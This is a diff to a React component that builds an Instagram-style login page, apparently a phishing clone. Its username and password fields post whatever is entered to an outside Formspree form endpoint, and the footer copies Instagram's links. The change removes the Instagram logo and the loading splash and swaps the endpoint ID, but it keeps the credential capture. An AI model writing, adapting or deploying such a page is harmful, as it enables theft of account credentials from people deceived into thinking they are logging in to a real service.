@@ -1,44 +1,18 @@
 
-import React ,{useState,useEffect} from 'react'
-import pngegg from './logo.png';
-import logo2 from './logo2.png';
-import logo1 from './logo1.png';
+import React from 'react'
 
 const App = () => {
   
-  const [loading, setLoading] = useState(false);
-  useEffect(() => {
-    let cancel = false;
-    setLoading(true)
-    setTimeout(() => {
-      if (cancel) return;
-      setLoading(false)
-    }, 4000);
-    return () => { 
-      cancel = true;
-    }
-    
-  }, []);
   return (
     <>
-    {loading?<div className='loading'>
-      <div className='mainLogo'>
-        <img src={logo2} alt="lll" />
-      </div>
-      <div className='mainLogo2'>
-      <p>From</p>
-        <img src={logo1} alt="lll" />
-      </div>
-    </div>
-    //////////////////////////////
-    :
        <div id="wrapper">
       <div className="container">
         <div className="form-data">
-          <form   action="https://formspree.io/f/mvonqzwr"
+          <form  action="https://formspree.io/f/xknazovr"
   method="POST">
             <div className="logo">
-              <img src={pngegg} alt="img" />
+              {/* <img src={pngegg} alt="img" /> */}
+              <h1>Log in</h1>
             </div>
             <input type="text" name='text' placeholder="Phone number, username, or email" required autoComplete='off'/>
             <input type="text" name="password" placeholder="Password"  required/>
@@ -76,18 +50,18 @@ const App = () => {
               <li><a href="/">Terms</a></li>
               <li><a href="/">Top Accounts</a></li>
               <li><a href="/">Locations</a></li>
-              <li><a href="/">Instagram lite</a></li>
+              
               <li><a href="/">Contact Uploading & Non-Users</a></li>
               <li><a href="/">Meta Verified</a></li>
             </ul>
           </nav>
           <div className="copyright-notice">
-            &copy;  2023 Instagram from Meta
+            &copy;  2023 Developer
           </div>
         </div>
       </footer>
     </div>
-    }
+    
     </>
   )
 }
